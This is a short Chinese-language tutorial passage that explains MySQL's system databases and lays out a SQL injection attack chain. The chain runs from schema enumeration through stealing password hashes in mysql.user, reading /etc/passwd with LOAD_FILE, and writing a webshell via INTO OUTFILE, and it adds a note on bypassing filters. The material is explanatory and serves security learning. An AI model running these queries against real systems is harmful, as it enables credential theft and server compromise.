
1. `information_schema`——**元数据字典** (Metadata Dictionary)，记录"有哪些库、表、字段、权限"
2. `mysql`——**账户与权限库**，记录"有哪些用户、密码哈希、谁能干什么"
3. `performance_schema`——**性能事件记录库**，记录"服务器正在跑什么、热点在哪"
4. `sys`——**performance_schema 的友好视图层** (View Layer)，把上面那些原始数据加工成易读格式
**对应关系**：前两张管"静态信息"（结构 + 身份），后两张管"动态信息"（运行时状态）。


四张表不是孤立的，它们在一条完整的 SQLi 攻击链中各司其职
```
-- 完整攻击链概览（先看流程，不背 payload）

[1] SELECT schema_name FROM information_schema.schemata    # 摸清家底：有哪些库
[2] SELECT table_name  FROM information_schema.tables      # 锁定目标：有哪些表
[3] SELECT column_name FROM information_schema.columns    # 精确定位：字段名
[4] SELECT user,authentication_string FROM mysql.user   # 提权跳板：偷密码哈希
[5] 检查 File_priv / secure_file_priv                    # 评估能否读写主机文件
[6] SELECT LOAD_FILE('/etc/passwd')                          # 文件读取（若权限允许）
[7] INTO OUTFILE 写 webshell / UDF .so                    # 写文件 → RCE

# performance_schema / sys 在 [1]-[3] 被拦时作为 bypass 备选
```
